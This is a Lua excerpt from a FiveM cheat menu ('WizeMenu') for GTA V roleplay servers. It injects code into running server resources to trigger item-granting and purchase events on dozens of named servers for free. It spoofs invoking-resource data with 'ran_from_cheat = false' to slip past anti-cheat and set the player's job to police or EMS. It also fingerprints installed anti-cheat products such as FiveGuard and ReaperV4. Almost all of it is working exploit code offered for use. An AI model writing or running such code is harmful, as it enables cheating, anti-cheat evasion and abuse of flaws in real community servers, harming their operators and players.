                    inject(('pcall(function() TriggerServerEvent("solos-methlab:server:itemadd", "%s", %d, true) end)'):format(itemInput, amountInput))
                    handled = true
                elseif trigger.id == "solos_moneywash" then
                    inject(('pcall(function() TriggerServerEvent("solos-moneywash:server:ItemAdd", "%s", %d) end)'):format(itemInput, amountInput))
                    handled = true
                elseif trigger.id == "solos_restaurants" then
                    inject(('pcall(function() TriggerServerEvent("solos-food:server:itemadd", "%s", %d) end)'):format(itemInput, amountInput))
                    handled = true
                elseif trigger.id == "t1ger_gangsystem" then
                    inject(('pcall(function() TriggerServerEvent("t1ger_lib:server:addItem", "%s", %d, "codeplugrunsu") end)'):format(itemInput, amountInput))
                    handled = true
                elseif trigger.id == "t1ger_lib" then
                    inject(('pcall(function() TriggerServerEvent("t1ger_lib:server:addItem", "%s", %d) end)'):format(itemInput, amountInput))
                    handled = true
                elseif trigger.id == "zat_weed" then
                    inject(('pcall(function() TriggerServerEvent("zat-weed:server:AddItem", "%s", nil, %d) end)'):format(itemInput, amountInput))
                    handled = true
                elseif trigger.id == "zat_farming" then
                    inject(('pcall(function() TriggerServerEvent("zat-farming:server:GiveItem", "%s", %d) end)'):format(itemInput, amountInput))
                    handled = true
                elseif trigger.id == "xmmx_letscookplus" then
                    inject(('pcall(function() TriggerServerEvent("xmmx_letscookplus:server:BuyItems", { totalCost = 0, cart = { { name = "%s", quantity = %d } } }, "bank") end)'):format(itemInput, amountInput))
                    handled = true
                elseif trigger.id == "fromthebottom_la" then
    inject(
        ('pcall(function() TriggerServerEvent("Pug:server:GiveChoppingItem", true, "%s", %d, nil) end)'):format(
            itemInput, amountInput
        )
    )
    handled = true

elseif trigger.id == "central_valley_v3" then
    inject(
        ('pcall(function() TriggerServerEvent("jim-consumables:server:toggleItem", true, "%s", %d) end)'):format(
            itemInput, amountInput
        )
    )
    handled = true

elseif trigger.id == "da_ghetto_la_rp" then
    inject(
        ('pcall(function() TriggerServerEvent("it-lib:toggleItem", true, "%s", %d, nil) end)'):format(
            itemInput, amountInput
        )
    )
    handled = true

elseif trigger.id == "mafia_land_rp" then               -- 1x only
    inject(
        ('pcall(function() TriggerServerEvent("devcore_smokev2:server:AddItem", "%s") end)'):format(
            itemInput
        )
    )
    handled = true

elseif trigger.id == "land_of_hustlers_rp" then          -- 1x only
    inject(
        ('pcall(function() TriggerServerEvent("devcore_needs:server:AddItem", "%s") end)'):format(
            itemInput
        )
    )
    handled = true

elseif trigger.id == "gangsters_paradice" then
    inject(
        ('pcall(function() TriggerServerEvent("r_scripts-tuningV2:server:buyItem", "%s", %d, 0) end)'):format(
            itemInput, amountInput
        )
    )
    handled = true

elseif trigger.id == "thegardens_chicago" then
    inject('pcall(function() TriggerServerEvent("esx-qalle-jail:prisonWorkReward") end)')
    handled = true

elseif trigger.id == "cold_hearted_nyc" then
    inject(
        ('pcall(function() TriggerServerEvent("xmmx_letscookplus:server:toggleItem", true, "%s", %d) end)'):format(
            itemInput, amountInput
        )
    )
    handled = true

elseif trigger.id == "revenge_serious_rp" then
    inject(
        ('pcall(function() TriggerServerEvent("jim-consumables:server:toggleItem", true, "%s", %d) end)'):format(
            itemInput, amountInput
        )
    )
    handled = true

elseif trigger.id == "straight_out_the_gutta_srp" then
    inject(
        ('pcall(function() TriggerServerEvent("t1ger_lib:server:addItem", "%s", %d) end)'):format(
            itemInput, amountInput
        )
    )
    handled = true

elseif trigger.id == "get_wild_chiraq_rp" then
    inject(
        ('pcall(function() TriggerServerEvent("xmmx_letscookplus:server:toggleItem", true, "%s", %d) end)'):format(
            itemInput, amountInput
        )
    )
    handled = true

elseif trigger.id == "ghost_city_roleplay" then          -- 1x only
    inject(
        ('pcall(function() TriggerServerEvent("apex_cluckinbell:client:addItem", "%s") end)'):format(
            itemInput
        )
    )
    handled = true

elseif trigger.id == "truevision_roleplay" then
    inject(
        ('pcall(function() TriggerServerEvent("tvrpdrugs:server:addItem", "%s", %d) end)'):format(
            itemInput, amountInput
        )
    )
    handled = true

elseif trigger.id == "tales_from_the_hood_rp" then
    inject(
        ('pcall(function() TriggerServerEvent("nk:barbeque:addItem", "%s", %d) end)'):format(
            itemInput, amountInput
        )
    )
    handled = true

elseif trigger.id == "the_strip_rp" then
    inject(
        ('pcall(function() TriggerServerEvent("matti-airsoft:giveItem", "%s", %d) end)'):format(
            itemInput, amountInput
        )
    )
    handled = true

elseif trigger.id == "murdaville_rp" then
    inject('pcall(function() TriggerServerEvent("apx_starterpack:server:markAsUsed") end)')
    handled = true

elseif trigger.id == "the_flats_roleplay" then
    inject(
        ('pcall(function() TriggerServerEvent("qb-advancedrugs:giveItem", "%s", %d) end)'):format(
            itemInput, amountInput
        )
    )
    handled = true

elseif trigger.id == "la_chronicles_roleplay" then
    inject(
        ('pcall(function() TriggerServerEvent("horizon_paymentsystem:giveItem", "%s", %d) end)'):format(
            itemInput, amountInput
        )
    )
    handled = true

elseif trigger.id == "toe_tag_world_rp" then
    inject(
        ('pcall(function() TriggerServerEvent("boii-moneylaunderer:sv:AddItem", "%s", %d) end)'):format(
            itemInput, amountInput
        )
    )
    handled = true

elseif trigger.id == "federal_nightmares_nyc" then
    inject(
        ('pcall(function() TriggerServerEvent("xmmx_letscookplus:server:toggleItem", true, "%s", %d) end)'):format(
            itemInput, amountInput
        )
    )
    handled = true

elseif trigger.id == "cfw_x3f6_s8" then
    inject(
        ('pcall(function() TriggerServerEvent("jim-recycle:server:toggleItem", true, "%s", %d) end)'):format(
            itemInput, amountInput
        )
    )
    handled = true

elseif trigger.id == "white_chalk_rp" then
    inject(
        ('pcall(function() TriggerServerEvent("angelicxs-CivilianJobs:Server:GainItem", "%s", math.floor(%d)) end)'):format(
            itemInput, amountInput
        )
    )
    handled = true
    
                    end

                if handled then
                    MachoMenuNotification("WizeMenu", "Trigger Worked, Enjoy! Using: " .. trigger.name, 5)
                    break
                end
            end
        end

        -----------------------------------------------------------------
        --  Fallback resource-specific actions
        -----------------------------------------------------------------
        if not handled then
            local resourceActions = {
                ["qb-uwujob"] = function()
                    MachoInjectResource2(3, CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                        local function aswdaw4atsdf()
                            TriggerServerEvent("qb-uwujob:addItem", "]] .. ItemName .. [[", ]] .. ItemAmount .. [[)
                        end
                        aswdaw4atsdf()
                    ]])
                end,
                ["skirpz_drugplug"] = function()
                    MachoInjectResource2(3, (CheckResource("ReaperV4") and "ReaperV4") or (CheckResource("monitor") and "monitor") or "any", [[
                        local function fawfafffsfzxfzx()
                            XTYZ = CreateThread
                            XTYZ(function()
                                for i = 1, ]] .. ItemAmount .. [[ do
                                    local dealer = "shop" .. math.random(1000,9999)
                                    TriggerServerEvent = TriggerServerEvent
                                    TriggerServerEvent('shop:purchaseItem', shop, ']] .. ItemName .. [[', 0)
                                    Wait(100)
                                end
                            end)
                        end
                        fawfafffsfzxfzx()
                    ]])
                end,
                ["ak47_whitewidowv2"] = function()
                    MachoInjectResource2(3, (CheckResource("ReaperV4") and "ReaperV4") or (CheckResource("monitor") and "monitor") or "any", [[
                        local function aXj49WqTpL()
                            local keyName = "ak47_whitewidowv2:process"
                            TriggerServerEvent(keyName, "]] .. ItemName .. [[", {money = 0}, ]] .. ItemAmount .. [[, 0)
                        end
                        aXj49WqTpL()
                    ]])
                end,
                ["ak47_business"] = function()
                    MachoInjectResource2(3, (CheckResource("ReaperV4") and "ReaperV4") or (CheckResource("monitor") and "monitor") or "any", [[
                        local function agjw37257gj()
                            local keyName = "ak47_business:processed"
                            TriggerServerEvent(keyName, "]] .. ItemName .. [[", ]] .. ItemAmount .. [[)
                        end
                        agjw37257gj()
                    ]])
                end,
                ["ars_hunting"] = function()
                    MachoInjectResource2(3, (CheckResource("ReaperV4") and "ReaperV4") or (CheckResource("monitor") and "monitor") or "any", [[
                        local function ZqMwLpTrYv()
                            local keyName = "ars_hunting:sellBuyItem"
                            TriggerServerEvent(keyName, { buy = true, item = "]] .. ItemName .. [[", price = 0, quantity = ]] .. ItemAmount .. [[ })
                        end
                        ZqMwLpTrYv()
                    ]])
                end,
                ["fivecode_camping"] = function()
                    MachoInjectResource2(3, (CheckResource("monitor") and "monitor") or "any", [[
                        local function GnRtCvXpKa()
                            local keyName = 'fivecode_camping:callCallback'
                            local KeyNameParams = 'fivecode_camping:shopPay'
                            TriggerServerEvent(keyName, KeyNameParams, 0, {
                                ['price'] = 0,
                                ['item'] = "]] .. ItemName .. [[",
                                ['amount'] = ]] .. ItemAmount .. [[,
                                ['label'] = 'WizeMenu'
                            }, {
                                ['args'] = {
                                    ['payment'] = {
                                        ['bank'] = true,
                                        ['cash'] = true
                                    }
                                },
                                ['entity'] = 9218,
                                ['distance'] = 0.64534759521484,
                                ['hide'] = false,
                                ['type'] = 'bank',
                                ['label'] = 'Open Shop',
                                ['coords'] = 'vector3(-773.2181, 5597.66, 33.97217)',
                                ['name'] = 'npcShop-vec4(-773.409973, 5597.819824, 33.590000, 172.910004)'
                            })
                        end
                        GnRtCvXpKa()
                    ]])
                end,
                ["spoodyGunPlug"] = function()
                    MachoInjectResource2(3, (CheckResource("spoodyGunPlug") and "spoodyGunPlug") or "any", [[
                        local function GnRtCvXpKa()
                            common:giveItem({ { item = "]] .. ItemName .. [[", amount = ]] .. ItemAmount .. [[ } })  
                        end
                        GnRtCvXpKa()
                    ]])
                end,
                ["solos-weedtable"] = function()
                    MachoInjectResource2(3, (CheckResource("ReaperV4") and "ReaperV4") or (CheckResource("monitor") and "monitor") or "any", [[
                        local function aqrqtsgw32w523w()
                            local keyName = "solos-weed:server:itemadd"
                            TriggerServerEvent(keyName, "]] .. ItemName .. [[", ]] .. ItemAmount .. [[)
                        end
                        aqrqtsgw32w523w()
                    ]])
                end
            }

            local found = false
            for res, act in pairs(resourceActions) do
                if GetResourceState(res) == "started" then
                    act()
                    found = true
                end
            end
            if not found then
                MachoMenuNotification("[NOTIFICATION] WizeMenu", "No Triggers Found.")
            end
        end
    end)

    if GetResourceState("es_extended") == "started" or GetResourceState("core") == "started" then
    MachoMenuButton(VIPTabSections[2], "Setjob Police #1 (New)", function()
        if GetResourceState("es_extended") == "started" then
            MachoMenuNotification("[NOTIFICATION] WizeMenu", "Your job has been set to police")
            MachoInjectResource2(NewThreadNs, "es_extended", [[
                function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end

                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end

                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                hNative("GetInvokingResourceData", function(originalFn, ...) return originalFn(...) end)
                hNative("ESX.SetPlayerData", function(originalFn, ...) return originalFn(...) end)

                local fake_execution_data = {
                    ran_from_cheat = false,
                    path = "core/server/main.lua",
                    execution_id = "324341234567890"
                }

                local original_GetInvokingResourceData = GetInvokingResourceData
                GetInvokingResourceData = function()
                    return fake_execution_data
                end

                ESX.SetPlayerData("job", {
                    name = "police",
                    label = "Police",
                    grade = 3,
                    grade_name = "lieutenant",
                    grade_label = "Lieutenant"
                })
                GetInvokingResourceData = original_GetInvokingResourceData
            ]])
        elseif GetResourceState("core") == "started" then
            MachoMenuNotification("[NOTIFICATION] WizeMenu", "Your job has been set to police")
            MachoInjectResource2(NewThreadNs, "core", [[
                function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end

                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end

                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                hNative("GetInvokingResourceData", function(originalFn, ...) return originalFn(...) end)
                hNative("ESX.SetPlayerData", function(originalFn, ...) return originalFn(...) end)

                local fake_execution_data = {
                    ran_from_cheat = false,
                    path = "core/server/main.lua",
                    execution_id = "324341234567890"
                }

                local original_GetInvokingResourceData = GetInvokingResourceData
                GetInvokingResourceData = function()
                    return fake_execution_data
                end

                ESX.SetPlayerData("job", {
                    name = "police",
                    label = "Police",
                    grade = 3,
                    grade_name = "lieutenant",
                    grade_label = "Lieutenant"
                })
                GetInvokingResourceData = original_GetInvokingResourceData
            ]])
        else
            print("Neither core nor es_extended started")
        end
    end)
end

if GetResourceState("scripts") == "started" or GetResourceState("framework") == "started" then
    MachoMenuButton(VIPTabSections[2], "Set Job #2(Police)", function()
        if GetResourceState("scripts") == "started" then
            MachoMenuNotification("[NOTIFICATION] WizeMenu", "Your job has been set to police")
            MachoInjectResource2(NewThreadNs, "scripts", [[
                function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end
                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end
                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                hNative("GetInvokingResourceData", function(originalFn, ...) return originalFn(...) end)
                local fake_execution_data = {
                    ran_from_cheat = false,
                    path = "scripts/server/main.lua",
                    execution_id = "324341234567890"
                }
                local original_GetInvokingResourceData = GetInvokingResourceData
                GetInvokingResourceData = function()
                    return fake_execution_data
                end
                local lp = LocalPlayer
                if lp and lp.state then
                    lp.state:set("job", {
                        name = "police",
                        label = "Police",
                        grade = 4,
                        grade_name = "sergeant"
                    }, true)
                    print("[✅] Job set to police successfully.")
                else
                    print("[⚠️] Failed to set job: LocalPlayer or state not available.")
                end
                GetInvokingResourceData = original_GetInvokingResourceData
            ]])
        elseif GetResourceState("framework") == "started" then
            MachoMenuNotification("[NOTIFICATION] WizeMenu", "Your job has been set to police")
            MachoInjectResource2(NewThreadNs, "framework", [[
                function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end
                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end
                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                hNative("GetInvokingResourceData", function(originalFn, ...) return originalFn(...) end)
                local fake_execution_data = {
                    ran_from_cheat = false,
                    path = "framework/server/main.lua",
                    execution_id = "324341234567890"
                }
                local original_GetInvokingResourceData = GetInvokingResourceData
                GetInvokingResourceData = function()
                    return fake_execution_data
                end
                local lp = LocalPlayer
                if lp and lp.state then
                    lp.state:set("job", {
                        name = "police",
                        label = "Police",
                        grade = 4,
                        grade_name = "sergeant"
                    }, true)
                    print("[✅] Job set to police successfully.")
                else
                    print("[⚠️] Failed to set job: LocalPlayer or state not available.")
                end
                GetInvokingResourceData = original_GetInvokingResourceData
            ]])
        else
            print("Neither scripts nor framework started")
        end
    end)
end

if GetResourceState("es_extended") == "started" or GetResourceState("core") == "started" then
    MachoMenuButton(VIPTabSections[2], "Setjob EMS #1 (New)", function()
        if GetResourceState("es_extended") == "started" then
            MachoMenuNotification("[NOTIFICATION] WizeMenu", "Your job has been set to EMS")
            MachoInjectResource2(NewThreadNs, "es_extended", [[
                function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end

                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end

                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                hNative("GetInvokingResourceData", function(originalFn, ...) return originalFn(...) end)
                hNative("ESX.SetPlayerData", function(originalFn, ...) return originalFn(...) end)

                local fake_execution_data = {
                    ran_from_cheat = false,
                    path = "es_extended/server/main.lua",
                    execution_id = "324341234567890"
                }

                local original_GetInvokingResourceData = GetInvokingResourceData
                GetInvokingResourceData = function()
                    return fake_execution_data
                end

                ESX.SetPlayerData("job", {
                    name = "ambulance",
                    label = "EMS",
                    grade = 3,
                    grade_name = "chief_doctor",
                    grade_label = "Chief Doctor"
                })
                GetInvokingResourceData = original_GetInvokingResourceData
            ]])
        elseif GetResourceState("core") == "started" then
            MachoMenuNotification("[NOTIFICATION] WizeMenu", "Your job has been set to EMS")
            MachoInjectResource2(NewThreadNs, "core", [[
                function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end

                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end

                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                hNative("GetInvokingResourceData", function(originalFn, ...) return originalFn(...) end)
                hNative("ESX.SetPlayerData", function(originalFn, ...) return originalFn(...) end)

                local fake_execution_data = {
                    ran_from_cheat = false,
                    path = "core/server/main.lua",
                    execution_id = "324341234567890"
                }

                local original_GetInvokingResourceData = GetInvokingResourceData
                GetInvokingResourceData = function()
                    return fake_execution_data
                end

                ESX.SetPlayerData("job", {
                    name = "ambulance",
                    label = "EMS",
                    grade = 3,
                    grade_name = "chief_doctor",
                    grade_label = "Chief Doctor"
                })
                GetInvokingResourceData = original_GetInvokingResourceData
            ]])
        else
            print("Neither core nor es_extended started")
        end
    end)
end
    --Testing
    -- ==============================================================

    
    -- Settings Tab
        MachoMenuButton(SettingTabSections[1], "Uninject", function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                Stopped = true
            ]])

            MachoInjectResource((CheckResource("core") and "core") or (CheckResource("es_extended") and "es_extended") or (CheckResource("qb-core") and "qb-core") or (CheckResource("monitor") and "monitor") or "any", [[
                anvzBDyUbl = false
                if fLwYqKoXpRtB then fLwYqKoXpRtB() end
                kLpMnBvCxZqWeRt = false
            ]])

            MachoMenuDestroy(MenuWindow)
        end)

        MachoMenuCheckbox(SettingTabSections[2], "RGB Menu", function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                if FmxmAlwkjfsfmaW == nil then FmxmAlwkjfsfmaW = false end
                FmxmAlwkjfsfmaW = true

                local function CreateRGBUI()
                    local wfgsmWAEJKF = CreateThread
                    wfgsmWAEJKF(function()
                        local offset = 0.0
                        while FmxmAlwkjfsfmaW and not Unloaded do
                            offset = offset + 0.065
                            local r = math.floor(127 + 127 * math.sin(offset))
                            local g = math.floor(127 + 127 * math.sin(offset + 2))
                            local b = math.floor(127 + 127 * math.sin(offset + 4))
                            MachoMenuSetAccent(MenuWindow, r, g, b)
                            Wait(25)
                        end
                    end)
                end

                CreateRGBUI()
            ]])
        end, function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                FmxmAlwkjfsfmaW = false
            ]])
        end)

        local r, g, b = 207, 16, 32

        MachoMenuSlider(SettingTabSections[2], "R", r, 0, 255, "", 0, function(value)
            r = value
            MachoMenuSetAccent(MenuWindow, math.floor(r), math.floor(g), math.floor(b))
        end)

        MachoMenuSlider(SettingTabSections[2], "G", g, 0, 255, "", 0, function(value)
            g = value
            MachoMenuSetAccent(MenuWindow, math.floor(r), math.floor(g), math.floor(b))
        end)

        MachoMenuSlider(SettingTabSections[2], "B", b, 0, 255, "", 0, function(value)
            b = value
            MachoMenuSetAccent(MenuWindow, math.floor(r), math.floor(g), math.floor(b))
        end)

        MachoMenuButton(SettingTabSections[3], "Anti-Cheat Checker", function()
            local function notify(fmt, ...)
                MachoMenuNotification("[NOTIFICATION] JTG Menu", string.format(fmt, ...))
            end

            local function ResourceFileExists(resourceNameTwo, fileNameTwo)
                local file = LoadResourceFile(resourceNameTwo, fileNameTwo)
                return file ~= nil
            end

            local numResources = GetNumResources()

            local acFiles = {
                { name = "ai_module_fg-obfuscated.lua", acName = "FiveGuard" },
            }

            for i = 0, numResources - 1 do
                local resourceName  = GetResourceByFindIndex(i)
                local resourceLower = string.lower(resourceName)

                for _, acFile in ipairs(acFiles) do
                    if ResourceFileExists(resourceName, acFile.name) then
                        notify("Anti-Cheat: %s", acFile.acName)
                        AntiCheat = acFile.acName
                        return resourceName, acFile.acName
                    end
                end

                local friendly = nil
                if resourceLower:sub(1, 7) == "reaperv" then
                    friendly = "ReaperV4"
                elseif resourceLower:sub(1, 4) == "fini" then
                    friendly = "FiniAC"
                elseif resourceLower:sub(1, 7) == "chubsac" then
                    friendly = "ChubsAC"
                elseif resourceLower:sub(1, 6) == "fireac" then
                    friendly = "FireAC"
                elseif resourceLower:sub(1, 7) == "drillac" then
                    friendly = "DrillAC"
                elseif resourceLower:sub(-7) == "eshield" then
                    friendly = "WaveShield"
                elseif resourceLower:sub(-10) == "likizao_ac" then
                    friendly = "Likizao-AC"
                elseif resourceLower:sub(1, 5) == "greek" then
                    friendly = "GreekAC"
                elseif resourceLower == "pac" then
                    friendly = "PhoenixAC"
                elseif resourceLower == "electronac" then
                    friendly = "ElectronAC"
                end

                if friendly then
                    notify("Anti-Cheat: %s", friendly)
                    AntiCheat = friendly
                    return resourceName, friendly
                end
            end

            notify("No Anti-Cheat found")
            return nil, nil
        end)

        MachoMenuButton(SettingTabSections[3], "Framework Checker", function()
            local function notify(fmt, ...)
                MachoMenuNotification("[NOTIFICATION] JTG Menu", string.format(fmt, ...))
            end

            local function IsStarted(res)
                return GetResourceState(res) == "started"
            end

            local frameworks = {
                { label = "ESX",       globals = { "ESX" },    resources = { "es_extended", "esx-legacy" } },
                { label = "QBCore",    globals = { "QBCore" }, resources = { "qb-core" } },
                { label = "Qbox",      globals = {},           resources = { "qbox" } },
                { label = "QBX Core",  globals = {},           resources = { "qbx-core" } },
                { label = "ox_core",   globals = { "Ox" },     resources = { "ox_core" } },
                { label = "ND_Core",   globals = { "NDCore" }, resources = { "nd-core", "ND_Core" } },
                { label = "vRP",       globals = { "vRP" },    resources = { "vrp" } },
            }

            local function DetectFramework()
                for _, fw in ipairs(frameworks) do
                    for _, g in ipairs(fw.globals) do
                        if _G[g] ~= nil then
                            return fw.label
                        end
                    end
                end
                for _, fw in ipairs(frameworks) do
                    for _, r in ipairs(fw.resources) do
                        if IsStarted(r) then
                            return fw.label
                        end
                    end
                end
                return "Standalone"
            end

            local frameworkName = DetectFramework()
            notify("Framework: %s", frameworkName)
        end)

        local AnimationDropDownChoice = 0

        local AnimationMap = {
            [0] = { name = "Default", hash = "MP_F_Freemode" },
            [1] = { name = "Gangster", hash = "Gang1H" },
            [2] = { name = "Wild", hash = "GangFemale" },
            [3] = { name = "Red Neck", hash = "Hillbilly" }
        }